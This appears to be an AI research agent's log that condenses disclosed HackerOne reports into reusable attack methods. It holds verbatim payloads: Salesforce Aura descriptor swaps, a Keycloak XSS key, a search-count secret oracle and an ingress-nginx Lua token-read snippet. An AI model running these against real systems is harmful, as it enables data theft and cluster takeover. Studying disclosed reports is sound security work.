ROUTE: live `.json` -> HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (the reporter body is public). Metadata: U.S. Dept Of Defense, "Sensitive data exposure: █████████ candidate resumes/CVs available to download with no authentication through BAC/IDOR/Improper Salesforce config", weakness Improper Access Control - Generic, severity High (7~8.9), reporter `oxylis`, submitted 2024-07-25, disclosed 2024-12-18, state Closed/Resolved, asset U.S. Dept Of Defense.
STATUS: UNVERIFIED (not reproduced — no Salesforce Experience Cloud instance was touched this pass; every request shape below is verbatim from the report body).
CLASS: broken access control / IDOR -> mass sensitive-file read — a Salesforce Experience Cloud (Lightning/Aura) site executes arbitrary Aura `ApexActionController` and component-controller methods without checking the visitor's access, and the file-download endpoint serves any `ContentDocument` by id with no authentication (CWE-863 / CWE-639).
CORE METHOD:
  1. ENTRY POINT — a public Experience Cloud page (here `/s/registration`) makes POSTs to `/s/sfsites/aura?r=1&aura.ApexAction.execute=1`. The body's `message` parameter is a JSON object with an `actions` array; each action has a `descriptor` and `params`. The page's own action is `aura://ApexActionController/ACTION$execute` with `params: {"namespace":"","classname":"RegistrationCtrl","method":"getFileUploadRecord","cacheable":false,"isContinuation":false}`.
  2. THE BYPASS — replace the `descriptor` with a DIFFERENT controller's method: `serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems` and set `params: {"entityNameOrId":"ContentDocument","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}`. The Aura endpoint executes it and returns 2000 `ContentDocument` records (all uploaded files).
  3. THE READ — extract any `Id` from the response (e.g. `069830000028KJdAAM`) and request `https://<site>/sfsites/c/sfc/servlet.shepherd/document/download/<Id>` — the file downloads with no authentication.
  4. THE IMPACT — thousands of candidate resumes/CVs, transcripts, PII, and any manually uploaded file.
DETECTION SIGNAL: a Salesforce Experience Cloud / Lightning site (`*.experience.cloud`, `*.force.com`, `*.site.com`) whose page posts to `/s/sfsites/aura` (look at the `aura.context`/`aura.pageURI` params and the `X-Sfdc-Lds-Endpoints` header); a `message` JSON whose `actions[].descriptor` is `aura://ApexActionController/ACTION$execute` or a `serviceComponent://...` descriptor; a download URL of the form `/sfsites/c/sfc/servlet.shepherd/document/download/<18-char-id>`. TELL: the endpoint dispatches on the `descriptor` string, so the visitor controls WHICH controller/method runs — the intended method (`RegistrationCtrl.getFileUploadRecord`) is scoped to the user's own upload, but the substituted controller (`SelectableListDataProviderController.getItems`) is not.
CHAIN: any unauthenticated visitor (primitive: a public Experience Cloud page that posts to `/aura`) -> rewrite the `message.actions[0].descriptor` to `serviceComponent://...SelectableListDataProviderController/ACTION$getItems` with `entityNameOrId: ContentDocument` (primitive: the Aura endpoint dispatches on the descriptor and never re-checks the visitor's access to the target controller) -> the endpoint returns up to 2000 `ContentDocument` records (escalation: cross-tenant record enumeration) -> take any `Id` and GET `/sfsites/c/sfc/servlet.shepherd/document/download/<Id>` (escalation: unauthenticated file download) -> mass PII/resume/CV disclosure (impact: large-scale data breach; the report's own words: "Large-scale data breach/candidate PII leak"; team severity High 7~8.9). Per doctrine §8: preconditions = none (unauthenticated, any public Experience Cloud page that posts to `/aura`); gain = every uploaded file on the site.
TRANSFERABLE TEST: on ANY Salesforce Experience Cloud / Lightning site — (1) open a public page and capture a POST to `/s/sfsites/aura` (or `/aura`) in Burp; (2) decode the `message` parameter and replace `actions[0].descriptor` with `serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems` and `params` with `{"entityNameOrId":"ContentDocument","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}`; (3) send it and check whether the response contains `ContentDocument` records with `Id`s; (4) take an `Id` and request `/sfsites/c/sfc/servlet.shepherd/document/download/<Id>` — if the file downloads with no auth, the chain is live. Rule: **the Aura endpoint is a generic method dispatcher keyed by the `descriptor` string — if you can swap the descriptor to a controller that reads an arbitrary entity, you can enumerate and download every record of that entity, and the shepherd download endpoint serves them with no auth check.**
DEDUPE: 0 hits across all three write targets for `2623715`, `salesforce`, `sfsites`, `/aura`, `SelectableListDataProvider`, `ContentDocument`, `ApexAction`, `shepherd/document`, or `experience.cloud`. The one `Salesforce` hit in `Bugbountyskills.md` (line ~23035) is an unrelated record-id key-prefix note. New general method -> §17.440.

---

SOURCE: https://hackerone.com/reports/2221104  2026-11-11
ROUTE: live `.json` -> HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (the reporter body is public). The report's own PoC is the malformed-JSON trigger `{" ":1}`; the concrete XSS payload was read from the credited public pentest report the HackerOne report cites — Cure53, "Pentest-Report Keycloak 8.0 Audit & Pentest 11.2019" (cure53.de/pentest-report_keycloak.pdf), finding KC-01-007, read this pass via `web_extract`. Metadata: U.S. Dept Of Defense, "Reflected XSS via Keycloak on ███ [CVE-2021-20323]", weakness Cross-site Scripting (XSS) - Reflected, severity Medium, CVE-2021-20323, reporter `maskedpersian`, submitted 2023-10-22, disclosed 2024-05-03, state Closed/Resolved, asset U.S. Dept Of Defense.
STATUS: UNVERIFIED (not reproduced — no Keycloak instance was touched this pass; the request shape is verbatim from the report body and the payload is verbatim from the credited cure53 report).
CLASS: reflected XSS via an unrecognized JSON field name — Keycloak's OpenID Connect Dynamic Client Registration endpoint reflects an unrecognized JSON property name unfiltered into an HTML error page (CWE-79).
CORE METHOD:
  1. ENTRY POINT — `POST /auth/realms/<realm>/clients-registrations/openid-connect` with `Content-Type: application/json`.
  2. THE PAYLOAD IS A JSON FIELD NAME, not a value — the report's own PoC is `{" ":1}` (a space key); the credited cure53 report gives the concrete XSS payload as an unrecognized field name: `{"<svg onload=alert(1)>": ...}`.
  3. THE REFLECTION — the server responds with an HTML error page containing the unrecognized field name verbatim: `Unrecognized field "<svg onload=alert(1)>" (class org.keycloak.representations.oidc.OIDCClientRepresentation), not marked as ignorable`.
  4. THE LIMIT — cure53 rates it Info: "not directly exploitable as it requires the request's content-type to be JSON. Browsers are not able to carry this out cross-origin because an SOP violation would take place." Delivery needs same-origin JS execution or a CORS/preflight allowance.
DETECTION SIGNAL: a Keycloak / Red Hat SSO / OIDC dynamic-client-registration endpoint (`/auth/realms/*/clients-registrations/openid-connect`, `/realms/*/clients-registrations/openid-connect` on newer Keycloak) that returns a 4xx error whose body contains the submitted JSON field name; a response with `Content-Type: text/html` for a JSON request; a version at or below Keycloak 8.0 (CVE-2021-20323). TELL: the error message echoes the field NAME — so the payload goes in a JSON key, not a value.
CHAIN: any visitor (primitive: a public OIDC client-registration endpoint) -> POST a JSON body whose field NAME is an HTML payload (primitive: the endpoint reflects unrecognized field names unfiltered into an HTML error page) -> the error page renders the payload in the Keycloak origin (escalation: script execution) -> the victim's Keycloak session cookie is readable (impact: cookie theft / account compromise; the report's own words: "An attacker can execute arbitrary script and thus steal cookie-based authentication credentials"). HONESTY NOTE: cure53 (the credited source) rates the delivery "not directly exploitable" because a browser cannot send the required `application/json` POST cross-origin without a CORS/preflight allowance; the chain reaches full impact only where the victim is same-origin or the preflight is satisfied. Per doctrine §8: preconditions = the victim renders the error page (same-origin JS execution or CORS allowance); gain = the Keycloak session cookie.
TRANSFERABLE TEST: on ANY Keycloak / OIDC dynamic-client-registration endpoint — (1) POST `Content-Type: application/json` with body `{"<svg onload=alert(1)>": "x"}` to `/auth/realms/<realm>/clients-registrations/openid-connect`; (2) inspect the 4xx response: if the field name appears verbatim in an HTML body, the reflection is live; (3) confirm the delivery constraint by checking whether the endpoint sends `Access-Control-Allow-Origin` for a cross-origin `Origin` header (if it does, a cross-origin `fetch` can deliver the payload; if not, the chain needs a same-origin delivery). Rule: **on a JSON API error page, the reflected token may be a field NAME rather than a value — put the HTML payload in a JSON key and read the error message; and always check the CORS preflight before claiming cross-origin XSS.**
DEDUPE: 0 hits across all three write targets for `2221104`, `CVE-2021-20323`, `keycloak`, `clients-registrations`, `cure53`, or a JSON-field-name reflection. New general method -> §17.441.

---

## [bugbountyhuntingskills.md] VALID BUT NOT APPENDED (nothing new, nothing invented)

- HackerOne #2201370 (MTN Group, "Information disclosure via enabled Django Debug Mode", reporter `nhx1`, submitted 2023-10-11, disclosed 2024-12-25, Medium 6.1, weakness Information Disclosure; full body read via the live `.json` route, `visibility: full`, 20,945-char page). Django `DEBUG=True` leaks error messages, the URLconf (all API endpoints), and environment variables — the report's own words: "I was also able to view environment variables by sending a POST request to `/api/auth/register` without the trailing slash" — plus arbitrary user registration, email enumeration, and a `/api/domains/dns-records` endpoint leaking DNS records/Origin IPs. The class (framework debug page / stack-trace leak) is already recorded as `Bugbountyskills.md` §5 V-03 ("Trigger errors with benign malformed input... Fingerprint the dump: Django DEBUG... Check non-error debug routes"), and the report documents NO chain beyond the disclosure (no use of the leaked env vars/SECRET_KEY, no account action), so per doctrine §5/§8 and the chain-only rule it is a primitive, not an entry. The Django-specific delta (the trailing-slash POST trigger and the 404 URLconf dump) is a detection signal, not a new technique.
- HackerOne #2787650 (AWS VDP, "Reflected XSS on Amazon EC2 Instance", reporter `perigou`, submitted 2024-10-17, disclosed 2024-12-24, closed Informative; full body read via the live page + `.json`). The body is a two-sentence CVE copy-paste: "The payload is injected into the errorCode parameter, which is reflected back to the user without proper validation or sanitization" — the URL is redacted (`███████);alert(document.domain)//`), there is no request shape, no payload, no bypass, and the team closed it Informative ("the behavior described in your report does not present a security concern to AWS, rather, it is on the customer side of the shared responsibility model"). INVALID, nothing concrete extracted.
- HackerOne #1278952 (U.S. Dept Of Defense, "Sensitive data exposure via /secure/███████ endpoint on ████████", reporter `njmulsqb`, submitted 2021-07-27, disclosed 2024-12-18, Medium, CVE-2020-14179, weakness Information Disclosure; full body read via the live page + `.json`). A CVE copy-paste: "Hit endpoint /jira/secure/██████████ in the target / Observe the results" — the endpoint name is redacted, there is no request shape, no parameter, no bypass, and no chain (the impact is "view custom field names and custom SLA names"). INVALID, nothing concrete extracted.
- HackerOne #2467232 (Liberapay, "Unsafe yaml load can lead to remote code execution", reporter `tarun_sec`, submitted 2024-04-17, disclosed 2024-05-04, Low, weakness Deserialization of Untrusted Data; full body read via the live page + `.json`). The report is a generic best-practice note — "Yaml.load() has the ability to construct an arbitrary Python object... Always use yaml.safe_load()" — pointing at `liberapay/testing/vcr.py#L40`. The reporter themself admits: "The unsafe parsing function is only called on files checked into the project's repository, so it isn't exactly fed untrusted data." There is no attacker-reachable sink, no payload, no request shape, and no chain; the team rated it Low. INVALID, nothing concrete extracted.

6 sources read, 0 fabricated.

NOTE — reader pass 2026-11-11 batch 146 (6 assigned sources read ONE BY ONE in the given order; 3 entries appended to the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file `/root/hackbot-architecture/knowledge/methodologies-2026-11-11.md`; 2 new §17 slots). NEW: (1) HackerOne #2213251 — a search/count endpoint that matches NON-PUBLIC content (the full body of a limited-disclosure report) and returns a hit COUNT is a boolean oracle; a wildcard prefix (`(PREFIX<guess>*) AND <report_id>`) turns it into a character-by-character secret extractor — `POST https://hackerone.com/graphql` `HacktivitySearchQuery` -> `search(index: HacktivityReportIndexService, query_string: ...)` -> `total_count`; NEW general method -> §17.442. (2) HackerOne #1249583 — ingress-nginx `server-snippet` Lua reads the controller pod's ServiceAccount token (whose ClusterRole can `list secrets` in ALL namespaces) -> the NEW atom is a Kubernetes `Service` of type `ExternalName` pointing at `kubernetes.default`, which turns the ingress into an unauthenticated kube-apiserver proxy -> §17.443 (the SA-token-read core is a DELTA of #1382919 / #2039464 / §17.172). (3) HackerOne #1539426 — a server-returned JSON `status` boolean gates a privileged page; tampering the response (`false` -> `true`) unlocks `/resetPassword` -> DELTA of the recorded client-side-gate class, NO §17 slot. VALID-BUT-DUPLICATE (read, nothing new, no entry): #1218754 (Semrush — a plaintext API token in a publicly served JS file, the already-recorded JS-bundle credential class), #617896 (GitLab "Login with Salesforce" — the already-recorded OAuth email-verification bypass class, #922456). INVALID (no entry, nothing invented): #1747978 (TikTok 2FA — `visibility: no-content`, 0-byte body, only a team summary with no endpoint/parameter/request shape). 6 sources read, 0 fabricated.

---

SOURCE: https://hackerone.com/reports/2213251  2026-11-11
ROUTE: live report page via `web_extract` -> HTTP 200, full reporter body + timeline + the browser-console JS PoC read IN FULL (the reporter body is public; the page renders from this egress). Metadata: HackerOne (team handle `security`), "New Search Feature: Search for non-public words in limited disclosure reports", weakness Information Disclosure, severity Medium 6.1 (the reporter raised it from Medium 4.4 to High 7.7; triage later downgraded it to Medium 4.4, final rating Medium 6.1), reporter `ahacker1`, submitted 2023-10-17, disclosed 2023-10-25, state Closed/Resolved.
STATUS: UNVERIFIED (not reproduced — no HackerOne account or search endpoint was touched this pass; every request shape below is verbatim from the report body / the PoC).
CLASS: information disclosure via a SEARCH-COUNT BOOLEAN ORACLE — a search endpoint that matches NON-PUBLIC content (the full body of a limited-disclosure report) and returns a hit COUNT gives a yes/no oracle; a wildcard prefix turns it into a character-by-character secret extractor (CWE-200 / CWE-209).
CORE METHOD:
  1. ENTRY POINT — the beta Hacktivity search. The PoC runs on an ANONYMOUS account (`hackerone.com/hacktivity/overview`, incognito) in the browser console and calls `POST https://hackerone.com/graphql`.
  2. THE QUERY, verbatim from the PoC: `{"operationName":"HacktivitySearchQuery","variables":{"queryString":"(<PREFIX><guess>*) AND <REPORT_ID>","size":1,"from":0,"sort":{"field":"total_awarded_amount","direction":"DESC"}},"query":"query HacktivitySearchQuery($queryString: String!, $from: Int, $size: Int, $sort: SortInput!) { search(index: HacktivityReportIndexService query_string: $queryString from: $from size: $size sort: $sort) { __typename total_count } }"}` with headers `accept: */*`, `content-type: application/json`, `x-csrf-token: <csrf-token meta value>`.
  3. THE ORACLE — `resp.data.search.total_count` is the boolean: `> 0` means the wildcard prefix `(PREFIX<guess>*)` matches a word in the FULL report (including the non-public body), `0` means it does not. The PoC's own loop tries every alphanumeric char (`a-z`, `A-Z`, `0-9`), keeps the first char that makes `total_count > 0`, appends it, and repeats.
  4. THE LEAK — the report's worked example: a (fake) GitHub personal access token starting with `ghp_` inside report #1711938. `(ghp_a*) AND 1711938` -> 0; ... `(ghp_f*) AND 1711938` -> a hit; then `(ghp_fa*)`, `(ghp_fb*)`, ... The reporter's cost estimate: 62 chars / 2 = 31 tries per character x 36 chars = ~1,116 requests. The PoC leaked 3 chars as a demo, 6 in the automated run.
  5. THE CORRECTION — the reporter first claimed character-by-character extraction, then retracted it ("it only works for full words, not characters, so secrets cannot be leaked"), then found the `*` wildcard makes character-by-character extraction possible again. The wildcard is the whole technique.
DETECTION SIGNAL: a search/count endpoint (GraphQL `search`, Elasticsearch `_search`, Algolia, a site-search API) that returns a hit COUNT (`total_count`, `total`, `hits.total`, `count`) and whose index includes content the caller cannot read — redacted text, private/draft records, limited-disclosure bodies, other users' data. TELL: the count changes for a term you cannot see anywhere in the public view. Secondary tell: the query language supports a trailing wildcard (`*`) or a prefix match.
CHAIN: any unauthenticated caller (primitive: the search endpoint needs no auth) -> submit `(PREFIX<guess>*) AND <id>` and read `total_count` (primitive: the count is a boolean oracle over non-public content) -> iterate the alphabet to extend the match one character at a time (escalation: character-by-character reconstruction) -> recover a secret redacted inside a limited-disclosure report (impact: disclosure of a credential/secret the platform deliberately hid; the report's own example is a `ghp_` GitHub PAT). Per doctrine §8: preconditions = none (anonymous, the beta search feature enabled); gain = any word/secret in the full body of a limited-disclosure report. HONESTY NOTE: the team rated it Medium 6.1 and closed it "C:L — no complete loss of confidentiality and the secrets which would be present in resolved reports would have already been revoked"; the reporter's own first impact claim (character-by-character without the wildcard) was retracted.
TRANSFERABLE TEST: on ANY search/count endpoint — (1) pick a record you cannot read (a redacted/private/draft item) and a term you know is in it; (2) query the search with that term plus the record id and read the hit count — if the count is > 0 for a term that appears nowhere in the public view, the index covers non-public content; (3) confirm the query language supports a prefix wildcard (`term*`, `(prefix*)`), then brute-force a secret character-by-character with `(PREFIX<guess>*) AND <id>` and watch `total_count`; (4) a hit at each step reconstructs the secret. Rule: **a search endpoint that returns a hit count over content you cannot see is a boolean oracle — if the query language supports a prefix wildcard, it is a character-by-character secret extractor.**
DEDUPE: 0 hits across all three write targets for `2213251`, `HacktivitySearchQuery`, `HacktivityReportIndexService`, or a count-based search oracle. Pre-existing hits that are RELATED but NOT this technique: `query_string` (ledger ~3277 / ~3281) is the GraphQL `sort_query`/`_script` Elasticsearch injection entry — a free-form SORT string reaching the query phase, not a hit-count oracle; `total_count` (ledger ~3135 / ~5533 / ~6663) is the GraphQL field-oracle counts (`soft_launch_invitations{total_count}`, `whitelisted_hackers{total_count}`, `participants{total_count}`), not a search-hit count; §17.174 (#493176) is a DIFFERENT mechanism — the ORDER of two concurrent HTTP/2 responses (timeless timing) as a cross-site search oracle — not a returned hit count; §17.206 is a `%<N>c` format-string oracle. New general method -> §17.442.

---

SOURCE: https://hackerone.com/reports/1539426  2026-11-11
ROUTE: live `.json` -> HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL. Metadata: UPS VDP, "Broken access control", weakness Improper Authentication - Generic, severity High, reporter `nayefhamouda`, submitted 2022-04-13, disclosed 2022-06-18, state Closed.
STATUS: UNVERIFIED (not reproduced — no UPS endpoint was touched this pass; the request/response shapes below are verbatim from the report body, whose domains are redacted).
CLASS: broken access control via a CLIENT-SIDE STATUS-FLAG GATE — the app's client branches on a server-returned `status` boolean to decide whether to show a privileged page, and the privileged page/flow does not re-verify the precondition server-side (CWE-863 / CWE-639).
CORE METHOD:
  1. ENTRY POINT — `POST /api/Account/SendTempPassword/?userName=<email>` (the report's request, verbatim: `HTTP/2`, `Host: ██████████████████`, `Cookie: ████████`, `Accept: application/json, text/plain, */*`, `Content-Length: 0`).
  2. THE GATE — the response is JSON: `{"status":false,"errorMessage":"Username does not exist. Please enter correct Username."}`.
  3. THE BYPASS — intercept the response and change `"status":false` to `"status":true` (the report: "On the burp site, intercept the response for this request and change this value ... change the 'status' value of this request from false to true").
  4. THE UNLOCK — then visit `/resetPassword`: "You will notice that this page has been opened without problems ... Go to user or report and you will notice that it opens normally and you can fully control it."
  5. THE IMPACT (report's words) — "The attacker can hack the admin control panel and view and modify all reports."
DETECTION SIGNAL: an endpoint that returns a JSON `status`/`success` boolean which the client uses to decide whether to render a privileged page or continue a flow; a privileged page/route that is reachable by URL and whose server-side handler does not re-check the precondition (a temp password was actually issued, the user is actually an admin); a reset/unlock flow whose only gate is the client's interpretation of the flag. TELL: flip the boolean in the intercepted response and reload the privileged route — if it renders and works, the gate is client-side.
CHAIN: any visitor (primitive: the `SendTempPassword` endpoint is reachable) -> intercept the JSON response and set `status:true` (primitive: the client trusts the flag) -> the client unlocks `/resetPassword` (escalation: the privileged flow is entered) -> the reset/admin page works with no server-side re-check (impact: admin panel access / full control of reports, per the report). Per doctrine §8: preconditions = the ability to intercept/modify your own response (Burp / a MITM position) and reach `/resetPassword`; gain = the admin/support panel. HONESTY NOTE: the report is thin — the domains are redacted, the PoC is a video, and no request shape is given for `/resetPassword` itself — so the exact server-side check that is missing is inferred from the report's steps, not shown.
TRANSFERABLE TEST: on ANY flow where a JSON response's `status`/`success` boolean gates a privileged page — (1) capture the gate endpoint's response; (2) flip the boolean to `true` and re-send/reload; (3) navigate directly to the privileged route (`/resetPassword`, `/admin`, `/unlock`) and check whether it renders and whether its server-side actions succeed; (4) if the privileged action works with the flag forged, the gate is client-side. Rule: **a server-returned `status` boolean is not an authorization check — flip it in the intercepted response and see whether the privileged page actually works.**
DEDUPE: 0 hits across all three write targets for `1539426`, `SendTempPassword`, `resetPassword`, `status.*tamper`, or a response-flag-gated route. The recorded client-side-gate material is a DIFFERENT mechanism: ledger ~line 9674 (a re-auth gate cleared by DROPPING the validation request, not tampering a response) and the detection signal at ~line 9405 ("a flow whose only auth gate is the redirect STATUS"). This entry is a DELTA of that class with a NEW MECHANISM (tampering a JSON `status` field), NO §17 slot.

---

SOURCE: https://hackerone.com/reports/1249583  2026-11-11
ROUTE: live `.json` -> HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (17,322 B — the YAML snippet, the impact, the kube-apiserver-proxy section and the PoC steps). Metadata: Kubernetes, "Authenticated kubernetes principal with restricted permissions can retrieve ingress-nginx serviceaccount token and secrets across all namespaces", weakness Privilege Escalation, severity High, reporter `libio`, submitted 2021-07-01, disclosed 2021-12-04, state Closed. Versions in-report: Kubernetes any (tested AWS EKS 1.20); ingress-nginx chart `ingress-nginx-3.33.0`, application `0.47.0`.
STATUS: UNVERIFIED (not reproduced — no Kubernetes cluster or ingress-nginx controller was touched this pass; every YAML/request below is verbatim from the report body).
CLASS: privilege escalation — an authenticated Kubernetes principal with permission to create `ingress` and `service` objects reads the ingress-nginx controller pod's ServiceAccount token via a `server-snippet` Lua block, then uses that token (whose ClusterRole can `list secrets` in ALL namespaces) to exfiltrate every cluster secret and every ServiceAccount token -> cluster-admin; a sibling `ExternalName` Service exposes the kube-apiserver itself (CWE-269 / CWE-200 / CWE-863).
CORE METHOD:
  1. THE SNIPPET — set `nginx.ingress.kubernetes.io/server-snippet` on an Ingress to a YAML block scalar, verbatim:
     `set_by_lua $token ' local file = io.open("/run/secrets/kubernetes.io/serviceaccount/token") if not file then return nil end local content = file:read "*a" file:close() return content ';`
     `location = /token { content_by_lua_block { ngx.say(ngx.var.token) } }`
  2. THE READ — request `https://$INGRESS_HOST/token` (the report: the hostname does not have to resolve to the controller's loadbalancer; adding the `Host` header manually also works) -> the controller pod's ServiceAccount JWT comes back in the body.
  3. THE ESCALATION — decode the token to confirm it is `ingress-nginx`; that ServiceAccount is bound to a ClusterRole that can `list secrets` in ALL namespaces. With it: exfiltrate all Kubernetes secrets, and read the tokens of ALL serviceaccounts -> elevate to potentially cluster-admin.
  4. THE KUBE-APISERVER PROXY (the NEW atom) — create a Kubernetes `Service` of type `ExternalName` pointing at `kubernetes.default` (the in-cluster API server DNS name) and an Ingress rule routing to it: "This can expose an otherwise private and protected kube-apiserver to untrusted networks like the internet." The PoC writes a kubeconfig that talks to the API server THROUGH the ingress-nginx proxy using the stolen token.
  5. THE PoC — `poc.sh` (requires `INGRESS_HOST`): applies the ingress + service, retrieves the token, writes a local kubeconfig (via the apiserver proxy, with the ingress-nginx token), writes all secrets from all namespaces to `secrets.json`, then for each serviceaccount token checks for cluster-admin and adds a user/context to the kubeconfig.
DETECTION SIGNAL: an ingress/controller whose config is templated from user-settable annotations or snippets (`nginx.ingress.kubernetes.io/server-snippet`, `configuration-snippet`, `*-snippet`) — the tell is that `{`, `}` and newlines SURVIVE into `/etc/nginx/nginx.conf`; the always-present token path `/run/secrets/kubernetes.io/serviceaccount/token` (or `/var/run/secrets/...`) mounted in the controller pod; a controller whose ClusterRole is broad (`list secrets` cluster-wide). For the proxy: a `Service` of type `ExternalName` whose `externalName` is `kubernetes.default` / `kubernetes.default.svc.cluster.local`, or any ingress rule whose backend is an in-cluster DNS name.
CHAIN: an authenticated principal that can create `ingress` + `service` (primitive: namespaced object write, no cluster role) -> the `server-snippet` value is spliced into `nginx.conf` and defines a Lua-backed location (primitive: config injection) -> GET `/token` returns the controller pod's ServiceAccount JWT (escalation: credential read) -> that SA's ClusterRole lists Secrets in ALL namespaces (escalation: cluster-wide secret/SA-token exfiltration) -> cluster-admin (impact). The sibling `ExternalName` Service exposes the kube-apiserver to untrusted networks (impact: control-plane exposure). Per doctrine §8: preconditions = create `ingress` + `service` in one namespace and network access to the controller; gain = every cluster secret and every ServiceAccount token, plus a proxied kube-apiserver.
TRANSFERABLE TEST: on ANY ingress-nginx / Traefik / HAProxy / Envoy / Istio instance you can create objects on — (1) apply an Ingress with `nginx.ingress.kubernetes.io/server-snippet` set to the `set_by_lua`/`content_by_lua_block` block above and request `/token` with a manual `Host` header; a JWT in the body proves the token-read; (2) decode it and run `kubectl --token=<jwt> auth can-i list secrets -A` (or `GET /api/v1/namespaces/*/secrets`) — a 200 proves the cluster-wide read; (3) create a `Service` of type `ExternalName` with `externalName: kubernetes.default` plus an Ingress rule for it and request the API server through the ingress host — a version/manifest response proves the control-plane proxy. Rule: **a snippet annotation that reaches Lua is a credential-read primitive — the mounted ServiceAccount token is the prize, and an `ExternalName` Service pointed at `kubernetes.default` turns the ingress into an unauthenticated kube-apiserver proxy.**
DEDUPE: the CORE of this report (ingress-nginx annotation/path injection -> read the controller pod's ServiceAccount token -> cluster-wide `list secrets`) is ALREADY RECORDED — #1382919 (`spec.rules.http.paths.path` -> `alias /var/run/secrets/kubernetes.io/serviceaccount/` -> GET `/gaf/token` -> token -> cluster-wide secrets, High 7.6), #2039464 (`permanent-redirect` -> Lua -> token -> `kubernetes.default.svc`), #1620702, and §17.172 (a directive-name denylist bypassed by an alternate directive reaching the same sink). This entry is a DELTA of that family. The NEW atom is the `ExternalName` Service -> kube-apiserver proxy: 0 hits across all three write targets for `ExternalName`, `kube-apiserver`, `apiserver`, or `kubernetes.default` as a proxy target. New general method (the ExternalName proxy) -> §17.443.

---

## [bugbountyhuntingskills.md] VALID BUT NOT APPENDED (nothing new, nothing invented)

- HackerOne #1218754 (Semrush, "API key (api.semrush.com) leak in JS-file", reporter `a_d_a_m`, submitted 2021-06-07, disclosed 2022-09-05, Medium, weakness Information Disclosure; `visibility: no-content`, 0-byte `vulnerability_information` in the live `.json`). The only public text is the researcher summary, verbatim: "When you access a page not found on the application, the source code of the page contains a portion of code that list a lot of javascript files. Some of these javascript files correspond to the Semrush internal interface, including some that display the internal statistics of Semrush's systems. These publicly accessible javascript files contained an internal API token that allowed access to internal statistics of Semrush's systems." The technique — a plaintext API token shipped in a publicly served JS file, replayed against the vendor API — is the already-recorded JS-bundle credential method (ledger ~line 8863; #2923061 1Password "API Key Exposed in JavaScript File" was marked VALID-BUT-DUPLICATE for exactly this class). The only delta is the entry point (a 404 page's HTML source enumerates the app's JS files, some internal), which is a detection signal, not a new technique, and the report documents NO chain beyond "internal statistics" — per the CHAIN-ONLY rule it is a primitive, not an entry.
- HackerOne #617896 (GitLab, "Bypass Email Verification using Salesforce -- Reproducible in gitlab.com", reporter `ngalog`, submitted 2019-06-18, disclosed 2019-12-13, High, weakness Violation of Secure Design Principles; `visibility: full`, body read IN FULL via the live `.json`). The technique — GitLab's "Login with Salesforce" SSO integration trusts the IdP's email claim, and Salesforce lets a user hold an arbitrary email, so GitLab's email-verification / email-domain whitelist/blacklist is bypassed ("salesforce allow admin to create user with arbitrary email, and I believe this is what gitlab engineer forgot to consider while implementing salesforce integration") — is the SAME general method already recorded at #922456 (GitLab, "Ability to bypass email verification for OAuth grants results in accounts takeovers on 3rd parties", reporter cache-money): "a provider's 'verified email' is a claim, not a fact — test the claim by requesting the grant through the RAW endpoint, and check whether the RP identifies users by email (mergeable) or by the provider's immutable subject id." #617896 is the same class with Salesforce as the IdP; the report body is thin (no request shape beyond "click login with salesforce"; the PoC is a screenshot), so no new technique was appended.
- HackerOne #1747978 (TikTok, "bypass two-factor authentication in Android apps and web", reporter `lu3ky-13`, submitted 2022-10-24, disclosed 2023-01-09, Medium, weakness Authentication Bypass Using an Alternate Path or Channel; `visibility: no-content`, 0-byte `vulnerability_information`). The only public text is the team summary, verbatim: "A vulnerability was found where a random timeout issue on a Two-Step Verification endpoint could have resulted in a potential bypass of authentication if multiple incorrect attempts were entered in quick succession. It was found that this vulnerability required access to the user's email/password or phone number/code associated with the account and multiple bruteforcing attempts to bypass would be needed." No endpoint, no parameter, no request shape, no bypass, no chain; `r.jina.ai` -> HTTP 401 (IP reputation), the Wayback capture (`20260316130235`) is the JS-disabled shell. INVALID, nothing concrete extracted.

6 sources read, 0 fabricated.

---

## [bugbountyhuntingskills.md] PASS 2026-11-11 (batch 144) — NOTHING NEW, 0 APPENDED

6 sources read ONE BY ONE in the assigned order; 3 VALID (readable, real, teaches a technique), 3 INVALID
(`visibility: no-content` stubs). 0 entries appended — no genuinely new technique, nothing fabricated.

- #531890 (X / xAI, "Subdomain takeover on dev-admin.periscope.tv", reporter `h1ch3ro`, submitted 2019-04-08,
  disclosed 2019-05-28, Medium 4-6.9, weakness Privilege Escalation; ROUTE: `web_extract` -> HTTP 200, full
  reporter body + timeline). Technique: dangling CNAME to an orphaned S3 website bucket
  (`dev-admin.periscope.tv.s3-website-us-west-2.amazonaws.com`), claimed by creating the bucket and uploading
  `index.html`. NOT APPENDED: the class is already recorded (§1.6 "Third-party / infrastructure inheritance
  (dangling CNAME)"; #154425 Fastly/sc-cdn.net — its DETECTION SIGNAL already lists `s3 buckets` as an edge
  target and its TRANSFERABLE TEST is the same enumerate-CDN-hostname -> register-service -> serve-canary
  method); 2019, outside the 6-12-month freshness window; no chain beyond hosting `index.html` on a dev
  subdomain; X closed it "not eligible for a bounty" ("the resolution of this issue was unrelated to your
  report").
- #4057637 (curl, "[HIGH] CWE-22 — Path Traversal in FTP Wildcard Download via Unencoded `.` in Escaped
  Filenames", reporter `mrtomato`, submitted 2026-09-24, disclosed 2026-09-26, weakness Path Traversal, closed
  **Informative**; ROUTE: `web_extract` -> HTTP 200, full reporter body + code-level analysis). Mechanism: in
  `CURLWC_DOWNLOADING` (`lib/ftp.c:4079-4095`), each LIST filename is escaped with `curl_easy_escape()`,
  which percent-encodes everything except the RFC 3986 unreserved set (A-Za-z0-9-._~) — so `.` survives and
  `../etc/passwd` becomes `..%2Fetc%2Fpasswd`; `ftp_parse_url_path()` then calls `Curl_urldecode()`
  (`lib/ftp.c:207-227`), which decodes it straight back to `../etc/passwd`; `REJECT_CTRL` only rejects
  control characters, with no `..`-component filtering or path normalization. NOT APPENDED: curl closed it
  **Informative** — "The curl security team does not consider this issue to be a vulnerability. Closed as
  informative as it was a bug to fix." The reporter conceded: "a malicious/MITM'd server that can hand back
  a bad filename can already serve whatever it wants on the path the client requested, so redirecting it to
